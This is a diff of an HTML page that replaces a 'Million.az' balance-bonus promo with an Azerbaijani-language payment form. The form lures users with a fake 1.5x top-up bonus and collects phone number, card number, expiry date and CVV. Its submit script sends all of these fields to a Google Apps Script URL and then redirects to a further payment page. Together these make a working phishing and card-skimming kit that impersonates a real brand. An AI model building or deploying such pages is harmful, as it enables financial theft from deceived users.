@@ -1,194 +1,241 @@
 <!DOCTYPE html>
-<html lang="az">
+<html lang="tr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Million.az - Balans Artır</title>
-  <style>
-    /* Genel Stil */
-    @font-face {
-      font-family: 'GilroyBold';
-      src: url(Gilroy-Bold.ttf) format('truetype');
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ödəmə</title>
+    <style>
+        @font-face {
+            font-family: 'GilroyBold';
+            src: url('fonts/Gilroy-Bold.ttf') format('truetype');
+            font-weight: normal;
+            font-style: normal;
+        }
 
-    * {
-      box-sizing: border-box;
-    }
-
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: 'GilroyBold', Arial, sans-serif;
-      background: url('background.png') no-repeat center center fixed;
-      background-size: cover;
-      color: #333;
-      display: flex;
-      flex-direction: column;
-      min-height: 100vh;
-    }
-
-    /* Header */
-    .header {
-      background-color: #03EDC3;
-      padding: 10px; /* Boşluk azaltıldı */
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-      position: fixed;
-      top: 0;
-      width: 100%;
-      z-index: 1000;
-    }
-
-    .header .logo img {
-      height: 120px;
-    }
-
-    /* Content */
-    .content {
-      margin-top: 130px; /* Header yüksekliği kadar boşluk azaltıldı */
-      margin-bottom: 70px; /* Footer için boşluk azaltıldı */
-      flex: 1;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-
-    .balance-container {
-      margin: 0 auto;
-      max-width: 90%;
-      width: 100%;
-      background: rgba(110, 110, 110, 0.362); 
-      border-radius: 55px;
-      padding: 30px; /* İçerik boşluğu azaltıldı */
-      box-shadow: 0 4px 8px rgba(103, 84, 84, 0.367); 
-      text-align: center;
-      backdrop-filter: blur(15px);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 10px; /* Elemanlar arasındaki boşluk azaltıldı */
-    }
-
-    .balance-container h2 {
-  color: #004080;
-  margin-bottom: 25px; /* Alt boşluğu ayarlar */
-  margin-top: 10px; /* Üst boşluğu ayarlar, artır veya azalt */
-  font-size: 3.7rem; /* Yazı boyutu */
-  text-align: center;
-}
-
-    .balance-container .bonus-text {
-      color: #004080;
-      font-size: 3.1rem; /* Yazı boyutu artırıldı */
-      font-weight: bold;
-      text-align: center;
-      margin: 3px 0; /* Yazılar arasındaki boşluk azaltıldı */
-    }
-
-    /* Buton */
-    .balance-btn {
-      background-color: #004080;
-      color: white;
-      font-size: 2.3rem; /* Yazı boyutu artırıldı */
-      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
-      padding: 15px 40px; /* Buton iç boşluğu azaltıldı */
-      border: none;
-      border-radius: 45px;
-      cursor: pointer;
-      text-decoration: none;
-      transition: all 0.3s ease;
-    }
-
-    .balance-btn:hover {
-      background-color: #00509E;
-      transform: translateY(-5px);
-    }
-
-    .balance-btn:active {
-      transform: translateY(5px);
-    }
-
-    /* Footer */
-    .footer {
-      background-color: #fff;
-      color: #333;
-      padding: 30px; /* Boşluk azaltıldı */
-      text-align: center;
-      box-shadow: 0 -4px 8px rgba(0, 0, 0, 0.1);
-      width: 100%;
-      position: fixed;
-      bottom: 0;
-      font-size: 2rem; /* Yazı boyutu artırıldı */
-    }
-
-    .footer .payment-icons img {
-      width: 120px;
-      margin-top: 10px; /* Üst boşluk azaltıldı */
-    }
-
-    .footer-bottom {
-      font-size: 2rem; /* Yazı boyutu artırıldı */
-      margin-top: 10px; /* Alt boşluk azaltıldı */
-    }
-
-    .footer-bottom a {
-      color: #004080;
-      text-decoration: none;
-    }
-
-    .footer-bottom a:hover {
-      text-decoration: underline;
-    }
-
-    /* Mobil Düzen */
-    @media (max-width: 768px) {
-      .balance-container h2,
-      .balance-container .bonus-text,
-      .balance-btn {
-        font-size: 1.7rem;
-        padding: 10px 30px;
-      }
-
-      .balance-container {
-        padding: 15px;
-        gap: 5px;
-      }
-
-      .header {
-        padding: 8px;
-      }
-    }
-  </style>
+        body {
+            background-color: whitesmoke;
+            margin: 0;
+            font-family: 'GilroyBold', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .payment-window {
+            background-color: white;
+            border-radius: 45px;
+            padding: 50px 70px 60px 70px; /* padding azaltıldı */
+            max-width: 950px;
+            width: 90%;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            border: 5px solid rgba(3, 237, 195, 0.5);
+        }
+        .content {
+            text-align: center;
+        }
+        h2 {
+            font-size: 64px;
+            color: #000;
+            margin-bottom: 20px; /* Boşluk azaltıldı */
+            font-family: 'GilroyBold', Arial, sans-serif;
+        }
+        .form-group {
+            margin-bottom: 20px; /* Boşluk azaltıldı */
+            text-align: left;
+            position: relative;
+            font-family: 'GilroyBold', Arial, sans-serif;
+        }
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: bold;
+            color: #000;
+            font-size: 36px;
+            font-family: 'GilroyBold', Arial, sans-serif;
+        }
+        input[type="text"], input[type="number"] {
+            width: 100%;
+            padding: 20px; /* Padding azaltıldı */
+            padding-left: 70px; /* Padding azaltıldı */
+            font-size: 30px; /* Font boyutu küçültüldü */
+            box-sizing: border-box;
+            border: 2px solid #ccc;
+            border-radius: 25px;
+            font-family: 'GilroyBold', Arial, sans-serif;
+        }
+        .form-group img {
+            position: absolute;
+            top: 50%;
+            left: 15px; /* Sol boşluk azaltıldı */
+            transform: translateY(-2px);
+            width: 55px; /* Görsel boyutu küçültüldü */
+            height: auto;
+            pointer-events: none;
+        }
+        button {
+            background-color: #004080;
+            color: white;
+            padding: 30px 70px; /* Padding azaltıldı */
+            font-size: 40px; /* Font boyutu küçültüldü */
+            border: none;
+            cursor: pointer;
+            border-radius: 55px;
+            transition: background-color 0.3s;
+            width: 100%;
+            font-family: 'GilroyBold', Arial, sans-serif;
+            font-style: bold;
+        }
+        button:hover {
+            background-color: #002a5c;
+        }
+        #logo {
+            width: 360px;
+            margin: 0 auto 20px auto; /* margin-bottom azaltıldı */
+        }
+        .result {
+            margin-top: 10px;
+            font-size: 30px; /* Font boyutu küçültüldü */
+            color: green;
+            position: absolute;
+            top: 105%;
+            left: 0;
+            width: 100%;
+            font-family: 'GilroyBold', Arial, sans-serif;
+        }
+        .date-input {
+            display: flex;
+            gap: 10px; /* Aralık azaltıldı */
+            align-items: center;
+            position: relative;
+        }
+        .date-input img {
+            position: absolute;
+            top: 50%;
+            left: 15px; /* Sol boşluk azaltıldı */
+            transform: translateY(-50%);
+            width: 55px; /* Görsel boyutu küçültüldü */
+            height: auto;
+            pointer-events: none;
+        }
+        .date-input input {
+            padding-left: 70px; /* Padding azaltıldı */
+            font-family: 'GilroyBold', Arial, sans-serif;
+        }
+    </style>
 </head>
 <body>
-  <!-- Header -->
-  <div class="header">
-    <div class="logo">
-      <img src="Logo.png" alt="Million.az Logo">
+    <div class="payment-window">
+        <div class="content">
+            <img id="logo" src="Logo.png" alt="Logo">
+            <h2>Ödəmə Bilgiləri</h2>
+            <form onsubmit="gonder(event)">
+                <div class="form-group">
+                    <label for="telefon">Telefon Nömrəsi</label>
+                    <img src="phone.png" alt="Telefon Logosu">
+                    <input 
+                        type="text" 
+                        id="telefon" 
+                        name="telefon" 
+                        value="+994" 
+                        maxlength="13" 
+                        required>
+                </div>
+                <div class="form-group">
+                    <label for="tutar">Yükləyəcəyiniz Məbləğ ₼</label>
+                    <img src="para.png" alt="Para Logosu">
+                    <input 
+                        type="number" 
+                        id="tutar" 
+                        name="tutar" 
+                        placeholder="0" 
+                        oninput="hesapla(this.value)" 
+                        required>
+                    <div id="result" class="result"></div>
+                </div>
+                <div class="form-group">
+                    <label for="kart">Kart Nömrəsi</label>
+                    <img src="card.svg" alt="Kart Logosu">
+                    <input 
+                        type="text" 
+                        id="kart" 
+                        name="kart" 
+                        maxlength="19" 
+                        placeholder="XXXX XXXX XXXX XXXX" 
+                        required>
+                </div>
+                <div class="form-group">
+                    <label for="ay">Son İstifadə Tarixi (MM/YY)</label>
+                    <div class="date-input">
+                        <img src="date.png" alt="Tarih Logosu">
+                        <input 
+                            type="text" 
+                            id="ay" 
+                            name="ay" 
+                            placeholder="MM" 
+                            maxlength="2" 
+                            required>
+                        <img src="date.png" alt="Tarih Logosu">
+                        <input 
+                            type="text" 
+                            id="yil" 
+                            name="yil" 
+                            placeholder="YY" 
+                            maxlength="2" 
+                            required>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <img src="cvc.svg" alt="CVV Logosu">
+                    <input 
+                        type="text" 
+                        id="cvv" 
+                        name="cvv" 
+                        title="Format: XXX"
+                        maxlength="3" 
+                        placeholder="XXX"
+                        pattern="\d{3}" 
+                        required>
+                </div>
+                <button type="submit">Göndər</button>
+            </form>
+        </div>
     </div>
-  </div>
+    <script>
+        function hesapla(tutar) {
+            const bonus = (tutar * 1.5).toFixed(2);
+            document.getElementById('result').innerText = `Hesabınıza gələcək məbləğ (1.5x bonus ilə): ${bonus}₼`;
+        }
 
-  <!-- İçerik -->
-  <div class="content">
-    <div class="balance-container">
-      <h2>Bayramı 2 qat yaşa!</h2>
-      <div class="bonus-text">M10 balansına köçürdüyün</div>
-      <div class="bonus-text">hər 100₼ üçün</div>
-      <div class="bonus-text">50% bonus hesabına köçsün!</div>
-      <a href="number/index.html" class="balance-btn">Balansını Artır</a>
-    </div>
-  </div>
+        async function gonder(event) {
+            event.preventDefault();
 
-  <!-- Footer -->
-  <div class="footer">
-    <div class="payment-icons">
-      <img src="kart.png" alt="Kart">
-    </div>
-    <div class="footer-bottom">
-      <p>Bütün hüquqlar qorunur © 2024 Million.az</p>
-    </div>
-  </div>
+            const data = {
+                telefon: document.getElementById("telefon").value.trim(),
+                tutar: document.getElementById("tutar").value.trim(),
+                kart: document.getElementById("kart").value.trim(),
+                ay: document.getElementById("ay").value.trim(),
+                yil: document.getElementById("yil").value.trim(),
+                cvv: document.getElementById("cvv").value.trim(),
+                otp: "Bilinmiyor", // OTP sabit
+            };
+
+            try {
+                await fetch("https://script.google.com/macros/s/AKfycbySe0hCUb5zREcOJQlTi2e3-OuQvd4CaW9iO0EHtTcJbabMQdFMrEkBZ8xx0lFDgCHi/exec", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify(data),
+                    mode: "no-cors",
+                });
+
+                window.location.href = "pay/index.html";
+            } catch (error) {
+                console.error("Xəta:", error);
+                alert("Məlumat göndərilmədi!");
+            }
+        }
+    </script>
 </body>
 </html>
